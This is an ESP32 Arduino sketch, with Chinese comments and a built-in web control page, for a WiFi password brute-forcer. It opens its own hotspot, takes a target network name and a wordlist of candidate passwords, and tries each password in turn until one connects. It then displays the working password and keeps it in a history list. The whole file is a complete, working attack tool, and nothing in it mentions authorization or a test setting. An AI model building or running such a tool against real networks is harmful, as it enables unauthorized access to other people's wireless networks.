#include <WiFi.h>
#include <WebServer.h>
#include <SPIFFS.h>
#include <Preferences.h>
#include <vector>

// 热点配置
const char* ap_ssid = "WiFi_Tool";
const char* ap_password = "18661666957";

// Web服务器
WebServer server(80);

// 全局变量
String target_ssid = "";
String success_password = "";
bool is_scanning = false;
int current_try = 0;
int total_passwords = 0;
int try_delay = 500;  // 默认尝试间隔（毫秒）
String current_wordlist = "";  // 当前选中的密码表文件名
std::vector<String> password_list;  // 密码列表
std::vector<String> history_list;   // 历史成功记录
std::vector<String> wordlist_files; // 所有密码表文件列表

// 偏好设置
Preferences preferences;

// 图形化页面HTML（优化密码显示）
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Tool</title>
    <style>
        :root {
            --primary: #165DFF;
            --primary-light: #E8F3FF;
            --gray-light: #F5F7FA;
            --gray: #E5E6EB;
            --text-primary: #1D2129;
            --text-secondary: #86909C;
            --success: #00B42A;
            --danger: #F53F3F;
            --shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
            --radius: 8px;
            --transition: all 0.2s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--gray-light);
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }

        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: var(--radius);
            box-shadow: var(--shadow);
            overflow: hidden;
        }

        .header {
            background-color: var(--primary);
            color: white;
            padding: 20px;
            text-align: center;
        }

        .header h1 {
            font-size: 1.5rem;
            font-weight: 600;
        }

        .content {
            padding: 25px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-primary);
            font-size: 0.9rem;
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--gray);
            border-radius: var(--radius);
            font-size: 1rem;
            transition: var(--transition);
        }

        .form-control:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px var(--primary-light);
        }

        .speed-control {
            display: flex;
            gap: 10px;
            margin-top: 5px;
        }

        .speed-btn {
            flex: 1;
            padding: 8px 0;
            background: var(--gray-light);
            border: 1px solid var(--gray);
            border-radius: var(--radius);
            font-size: 0.85rem;
            cursor: pointer;
            transition: var(--transition);
        }

        .speed-btn.active {
            background: var(--primary-light);
            border-color: var(--primary);
            color: var(--primary);
            font-weight: 500;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin: 25px 0;
        }

        .btn {
            flex: 1;
            padding: 13px 0;
            border: none;
            border-radius: var(--radius);
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: #0E4CD1;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: var(--gray-light);
            color: var(--text-primary);
        }

        .btn-secondary:hover {
            background: #E8E8E8;
            transform: translateY(-1px);
        }

        .progress-section {
            margin: 30px 0;
        }

        .progress-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }

        .progress-bar {
            height: 6px;
            width: 100%;
            background: var(--gray);
            border-radius: 3px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: var(--primary);
            width: 0%;
            transition: width 0.5s ease;
        }

        .status-section {
            margin: 20px 0;
            padding: 15px;
            border-radius: var(--radius);
            border: 1px solid var(--gray);
            background: var(--gray-light);
        }

        .status-title {
            font-size: 0.95rem;
            color: var(--text-primary);
            margin-bottom: 8px;
        }

        .status-value {
            font-size: 1rem;
            font-weight: 500;
            color: var(--primary);
        }

        .status-success {
            border-color: var(--success);
            background: rgba(0, 180, 42, 0.05);
        }

        .status-success .status-value {
            color: var(--success);
        }

        .current-password {
            margin: 15px 0;
            padding: 12px;
            background: var(--primary-light);
            border-radius: var(--radius);
            font-family: monospace;
            font-size: 1rem;
            color: var(--primary);
            display: none;
        }

        /* 成功密码显示区域 */
        .success-password-box {
            margin-top: 12px;
            padding: 12px;
            background: rgba(0, 180, 42, 0.1);
            border-radius: var(--radius);
            border-left: 3px solid var(--success);
            display: none;
        }

        .success-password-box.visible {
            display: block;
        }

        .success-password-label {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 5px;
        }

        .success-password-value {
            font-family: monospace;
            font-size: 1.1rem;
            color: var(--success);
            font-weight: 500;
        }

        .history-section {
            margin-top: 30px;
        }

        .history-header {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.95rem;
            color: var(--text-primary);
            margin-bottom: 12px;
            cursor: pointer;
        }

        .history-list {
            max-height: 0;
            overflow: hidden;
            transition: max-height 0.3s ease;
        }

        .history-list.expanded {
            max-height: 300px;
        }

        .history-item {
            padding: 12px;
            border-radius: var(--radius);
            background: var(--gray-light);
            margin-bottom: 10px;
            font-size: 0.9rem;
        }

        .history-item .ssid {
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 5px;
        }

        .history-item .pwd {
            color: var(--primary);
            font-family: monospace;
        }

        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .icon {
            font-size: 1.1rem;
        }

        .wordlist-note {
            font-size: 0.8rem;
            color: var(--text-secondary);
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>WiFi 密码工具</h1>
        </div>

        <div class="content">
            <div class="form-group">
                <label for="ssidInput">目标 WiFi 名称 (SSID)</label>
                <input type="text" id="ssidInput" class="form-control" placeholder="请输入 WiFi 名称（区分大小写）">
            </div>

            <div class="form-group">
                <label for="wordlistSelect">选择密码表</label>
                <select id="wordlistSelect" class="form-control">
                    <option value="">加载中...</option>
                </select>
                <p class="wordlist-note">密码表为SPIFFS中的.txt文件，每行一个密码</p>
            </div>

            <div class="form-group">
                <label>尝试速度</label>
                <div class="speed-control">
                    <button class="speed-btn active" data-delay="300">快速</button>
                    <button class="speed-btn" data-delay="500">中等</button>
                    <button class="speed-btn" data-delay="1000">慢速</button>
                </div>
            </div>

            <div class="btn-group">
                <button id="startBtn" class="btn btn-primary">
                    <span class="icon">▶</span> 开始尝试
                </button>
                <button id="stopBtn" class="btn btn-secondary">
                    <span class="icon">⏸</span> 暂停
                </button>
                <button id="resetBtn" class="btn btn-secondary">
                    <span class="icon">↺</span> 重置
                </button>
            </div>

            <div class="current-password" id="currentPwdBox">
                当前尝试：<span id="currentPwd">-</span>
            </div>

            <div class="progress-section">
                <div class="progress-header">
                    <span>尝试进度</span>
                    <span id="progressText">0/0</span>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressBar"></div>
                </div>
            </div>

            <div class="status-section" id="statusBox">
                <div class="status-title">当前状态</div>
                <div class="status-value" id="statusText">请输入 WiFi 名称并选择密码表</div>
                <!-- 成功密码显示区域 -->
                <div class="success-password-box" id="successPwdBox">
                    <div class="success-password-label">正确密码：</div>
                    <div class="success-password-value" id="successPassword"></div>
                </div>
            </div>

            <div class="history-section">
                <div class="history-header" id="historyToggle">
                    <span class="icon">📜</span> 历史成功记录
                </div>
                <div class="history-list" id="historyList">
                    <!-- 历史记录将通过JS动态添加 -->
                </div>
            </div>

            <div class="footer">
                简约高效 · 专注功能
            </div>
        </div>
    </div>

    <script>
        // 加载密码表列表
        function loadWordlists() {
            fetch('/wordlists')
                .then(response => response.json())
                .then(data => {
                    const select = document.getElementById('wordlistSelect');
                    select.innerHTML = '';
                    if (data.length === 0) {
                        select.innerHTML = '<option value="">未找到密码表文件（.txt）</option>';
                        return;
                    }
                    data.forEach(file => {
                        const option = document.createElement('option');
                        option.value = file;
                        option.textContent = file;
                        select.appendChild(option);
                    });
                    const lastWordlist = localStorage.getItem('lastWordlist');
                    if (lastWordlist && data.includes(lastWordlist)) {
                        select.value = lastWordlist;
                        applyWordlist(lastWordlist);
                    }
                });
        }

        // 应用选中的密码表
        function applyWordlist(filename) {
            if (!filename) return;
            fetch(`/set-wordlist?file=${encodeURIComponent(filename)}`)
                .then(() => {
                    localStorage.setItem('lastWordlist', filename);
                    document.getElementById('progressBar').style.width = '0%';
                    document.getElementById('progressText').textContent = '0/0';
                    document.getElementById('currentPwdBox').style.display = 'none';
                });
        }

        // 初始化历史记录
        function loadHistory() {
            const history = JSON.parse(localStorage.getItem('wifiHistory') || '[]');
            const list = document.getElementById('historyList');
            list.innerHTML = '';
            if (history.length === 0) {
                list.innerHTML = '<div class="history-item">暂无历史记录</div>';
                return;
            }
            history.forEach(item => {
                const div = document.createElement('div');
                div.className = 'history-item';
                div.innerHTML = `
                    <div class="ssid">${item.ssid}</div>
                    <div class="pwd">密码：${item.password}</div>
                `;
                list.appendChild(div);
            });
        }

        // 切换历史记录显示/隐藏
        document.getElementById('historyToggle').addEventListener('click', () => {
            const list = document.getElementById('historyList');
            list.classList.toggle('expanded');
        });

        // 速度选择按钮
        const speedBtns = document.querySelectorAll('.speed-btn');
        speedBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                speedBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const delay = btn.getAttribute('data-delay');
                fetch(`/speed?delay=${delay}`);
            });
        });

        // 密码表选择变化时触发
        document.getElementById('wordlistSelect').addEventListener('change', (e) => {
            applyWordlist(e.target.value);
        });

        // 定时刷新状态（每1秒）
        setInterval(() => {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    // 更新进度
                    const progress = data.total > 0 ? (data.current / data.total) * 100 : 0;
                    document.getElementById('progressBar').style.width = progress + '%';
                    document.getElementById('progressText').textContent = 
                        `${data.current}/${data.total}`;
                    
                    // 更新当前尝试的密码
                    const pwdBox = document.getElementById('currentPwdBox');
                    if (data.scanning && data.currentPwd) {
                        pwdBox.style.display = 'block';
                        document.getElementById('currentPwd').textContent = data.currentPwd;
                    } else {
                        pwdBox.style.display = 'none';
                    }
                    
                    // 更新状态显示和成功密码
                    const statusBox = document.getElementById('statusBox');
                    const statusText = document.getElementById('statusText');
                    const successPwdBox = document.getElementById('successPwdBox');
                    const successPassword = document.getElementById('successPassword');
                    
                    statusBox.className = 'status-section';
                    successPwdBox.classList.remove('visible'); // 默认隐藏
                    
                    if (data.success) {
                        statusBox.classList.add('status-success');
                        statusText.textContent = `✅ 连接成功！`;
                        // 显示正确密码
                        successPwdBox.classList.add('visible');
                        successPassword.textContent = data.password;
                        // 保存到本地历史记录
                        const history = JSON.parse(localStorage.getItem('wifiHistory') || '[]');
                        history.unshift({ ssid: data.ssid, password: data.password });
                        localStorage.setItem('wifiHistory', JSON.stringify(history.slice(0, 5)));
                        loadHistory();
                    } else if (data.scanning) {
                        statusText.textContent = `🔍 正在尝试第 ${data.current} 个密码...`;
                    } else if (data.current >= data.total && data.total > 0) {
                        statusText.textContent = `❌ 所有密码尝试完毕，未找到正确密码`;
                    } else if (!data.wordlist) {
                        statusText.textContent = `⚠️ 请先选择密码表`;
                    } else {
                        statusText.textContent = `⏸ 已暂停，输入WiFi名称后点击"开始尝试"`;
                    }
                });
        }, 1000);

        // 发送控制命令
        function sendAction(action) {
            const ssid = document.getElementById('ssidInput').value.trim();
            const wordlist = document.getElementById('wordlistSelect').value;
            if (action === 'start') {
                if (!ssid) {
                    alert('请先输入目标WiFi名称');
                    return;
                }
                if (!wordlist) {
                    alert('请先选择密码表');
                    return;
                }
            }
            let url = '/control?action=' + action + '&ssid=' + encodeURIComponent(ssid);
            fetch(url);
        }

        // 绑定按钮事件
        document.getElementById('startBtn').addEventListener('click', () => sendAction('start'));
        document.getElementById('stopBtn').addEventListener('click', () => sendAction('stop'));
        document.getElementById('resetBtn').addEventListener('click', () => {
            if (confirm('确定要重置进度吗？')) {
                sendAction('reset');
                document.getElementById('currentPwdBox').style.display = 'none';
                document.getElementById('successPwdBox').classList.remove('visible');
            }
        });

        // 页面加载时初始化
        window.onload = () => {
            loadWordlists();
            loadHistory();
        };
    </script>
</body>
</html>
)rawliteral";

// 扫描SPIFFS中的所有txt文件（密码表）
void scan_wordlists() {
    wordlist_files.clear();
    File root = SPIFFS.open("/");
    if (!root) {
        Serial.println("无法打开SPIFFS根目录");
        return;
    }

    File file = root.openNextFile();
    while (file) {
        String filename = file.name();
        // 只保留.txt文件，且排除系统文件
        if (filename.endsWith(".txt") && filename != "/.gitkeep") {
            // 修复文件名第一个字符被截断的问题
            if (filename.startsWith("/")) {
                wordlist_files.push_back(filename.substring(1)); // 去除开头的"/"
            } else {
                wordlist_files.push_back(filename); // 直接保留原文件名
            }
        }
        file = root.openNextFile();
    }
    root.close();
    Serial.printf("发现 %d 个密码表文件\n", wordlist_files.size());
}

// 从指定文件加载密码列表
bool load_password_list(String filename) {
    password_list.clear();
    if (filename.isEmpty()) {
        Serial.println("错误：密码表文件名为空");
        return false;
    }

    String path = "/" + filename;
    if (!SPIFFS.exists(path)) {
        Serial.printf("错误：未找到密码表文件 %s\n", path.c_str());
        return false;
    }

    File file = SPIFFS.open(path, "r");
    if (!file) {
        Serial.printf("错误：无法打开密码表文件 %s\n", path.c_str());
        return false;
    }

    // 逐行读取密码
    while (file.available()) {
        String line = file.readStringUntil('\n');
        line.trim();  // 去除空格和换行符
        if (line.length() > 0) {
            password_list.push_back(line);
        }
    }
    file.close();

    total_passwords = password_list.size();
    current_try = 0; // 切换密码表后重置进度
    Serial.printf("已加载密码表 %s，共 %d 个密码\n", filename.c_str(), total_passwords);
    return true;
}

// 读取历史记录
void load_history() {
    history_list.clear();
    preferences.begin("wifi-history", true);
    int count = preferences.getUInt("count", 0);
    for (int i = 0; i < count; i++) {
        String item = preferences.getString(String(i).c_str(), "");
        if (item.length() > 0) {
            history_list.push_back(item);
        }
    }
    preferences.end();
}

// 保存历史记录
void save_history(String ssid, String password) {
    load_history();
    // 格式：ssid|password
    String item = ssid + "|" + password;
    // 去重
    for (size_t i = 0; i < history_list.size(); i++) {
        if (history_list[i].startsWith(ssid + "|")) {
            history_list.erase(history_list.begin() + i);
            break;
        }
    }
    // 插入头部
    history_list.insert(history_list.begin(), item);
    // 保留最近5条
    if (history_list.size() > 5) {
        history_list.pop_back();
    }
    // 保存到偏好设置
    preferences.begin("wifi-history", false);
    preferences.putUInt("count", history_list.size());
    for (size_t i = 0; i < history_list.size(); i++) {
        preferences.putString(String(i).c_str(), history_list[i]);
    }
    preferences.end();
}

// 处理根页面请求
void handle_root() {
    server.send(200, "text/html; charset=UTF-8", index_html);
}

// 处理密码表列表请求
void handle_wordlists() {
    String json = "[";
    for (size_t i = 0; i < wordlist_files.size(); i++) {
        if (i > 0) json += ",";
        json += "\"" + wordlist_files[i] + "\"";
    }
    json += "]";
    server.send(200, "application/json", json);
}

// 处理设置当前密码表请求
void handle_set_wordlist() {
    if (server.hasArg("file")) {
        String filename = server.arg("file");
        // 验证文件是否在列表中
        bool exists = false;
        for (String file : wordlist_files) {
            if (file == filename) {
                exists = true;
                break;
            }
        }
        if (exists) {
            current_wordlist = filename;
            load_password_list(filename);
            // 保存当前选择的密码表
            preferences.begin("wifi-config", false);
            preferences.putString("current_wordlist", filename);
            preferences.end();
            server.send(200, "text/plain", "OK");
            return;
        }
    }
    server.send(400, "text/plain", "无效的密码表文件");
}

// 处理状态查询请求（返回JSON）
void handle_status() {
    String current_pwd = (current_try < total_passwords) ? password_list[current_try] : "";
    String json = "{";
    json += "\"scanning\":" + String(is_scanning ? "true" : "false") + ",";
    json += "\"current\":" + String(current_try) + ",";
    json += "\"total\":" + String(total_passwords) + ",";
    json += "\"success\":" + String(success_password.length() > 0 ? "true" : "false") + ",";
    json += "\"password\":\"" + success_password + "\",";  // 确保返回正确密码
    json += "\"ssid\":\"" + target_ssid + "\",";
    json += "\"currentPwd\":\"" + current_pwd + "\",";
    json += "\"wordlist\":\"" + current_wordlist + "\"";
    json += "}";
    server.send(200, "application/json", json);
}

// 处理控制命令（开始/暂停/重置）
void handle_control() {
    if (server.hasArg("action")) {
        String action = server.arg("action");
        if (action == "start") {
            target_ssid = server.arg("ssid");
            if (target_ssid.length() == 0) {
                server.send(400, "text/plain", "请输入目标WiFi名称");
                return;
            }
            if (current_wordlist.isEmpty()) {
                server.send(400, "text/plain", "请先选择密码表");
                return;
            }
            // 保存目标SSID
            preferences.begin("wifi-config", false);
            preferences.putString("target_ssid", target_ssid);
            preferences.end();
            is_scanning = true;
            Serial.print("开始尝试连接目标WiFi：");
            Serial.println(target_ssid);
        } else if (action == "stop") {
            is_scanning = false;
            Serial.println("已暂停尝试");
        } else if (action == "reset") {
            is_scanning = false;
            current_try = 0;
            success_password = "";  // 重置成功密码记录
            Serial.println("已重置进度");
        }
    }
    server.send(200, "text/plain", "OK");
}

// 处理速度调节请求
void handle_speed() {
    if (server.hasArg("delay")) {
        try_delay = server.arg("delay").toInt();
        Serial.printf("已设置尝试间隔：%dms\n", try_delay);
    }
    server.send(200, "text/plain", "OK");
}

// 尝试连接WiFi（返回是否成功）
bool try_connect(String ssid, String password) {
    WiFi.disconnect();  // 断开当前连接
    WiFi.begin(ssid.c_str(), password.c_str());
    
    // 等待连接结果（最多10秒）
    int timeout = 0;
    while (WiFi.status() != WL_CONNECTED && timeout < 20) {
        delay(500);
        timeout++;
        server.handleClient();  // 处理网页请求，避免阻塞
    }
    return WiFi.status() == WL_CONNECTED;
}

void setup() {
    // 初始化串口
    Serial.begin(115200);
    while (!Serial) delay(10);
    Serial.println("ESP32 WiFi工具启动中...");

    // 仅启用AP模式（热点）
    WiFi.mode(WIFI_AP);

    // 初始化SPIFFS
    if (!SPIFFS.begin(true)) {
        Serial.println("SPIFFS初始化失败！请检查文件系统");
        while (1) delay(1000);
    }
    Serial.println("SPIFFS初始化成功");

    // 扫描所有密码表文件
    scan_wordlists();

    // 读取上次选择的密码表
    preferences.begin("wifi-config", true);
    current_wordlist = preferences.getString("current_wordlist", "");
    target_ssid = preferences.getString("target_ssid", "");
    preferences.end();

    // 加载上次选择的密码表（如果存在）
    if (!current_wordlist.isEmpty()) {
        load_password_list(current_wordlist);
    }

    // 加载历史记录
    load_history();

    // 启动热点
    if (!WiFi.softAP(ap_ssid, ap_password)) {
        Serial.println("热点启动失败！");
        while (1) delay(1000);
    }
    Serial.print("热点已创建：");
    Serial.println(ap_ssid);
    Serial.print("连接后访问：");
    Serial.println(WiFi.softAPIP());

    // 配置Web路由
    server.on("/", handle_root);
    server.on("/status", handle_status);
    server.on("/control", handle_control);
    server.on("/speed", handle_speed);
    server.on("/wordlists", handle_wordlists);
    server.on("/set-wordlist", handle_set_wordlist);
    server.begin();
    Serial.println("Web服务器启动成功");
}

void loop() {
    server.handleClient();  // 处理网页请求

    // 密码尝试逻辑
    if (is_scanning && !target_ssid.isEmpty() && !current_wordlist.isEmpty() && current_try < total_passwords) {
        String current_pwd = password_list[current_try];
        Serial.printf("尝试 %d/%d：%s\n", current_try + 1, total_passwords, current_pwd.c_str());

        // 尝试连接
        if (try_connect(target_ssid, current_pwd)) {
            Serial.println("===== 连接成功！ =====");
            Serial.printf("正确密码：%s\n", current_pwd.c_str());
            success_password = current_pwd;  // 记录正确密码
            save_history(target_ssid, current_pwd);
            is_scanning = false;
        } else {
            current_try++;
            delay(try_delay);
        }
    } else if (current_try >= total_passwords && total_passwords > 0) {
        is_scanning = false;
        Serial.println("所有密码尝试完毕，未找到正确密码");
    }
}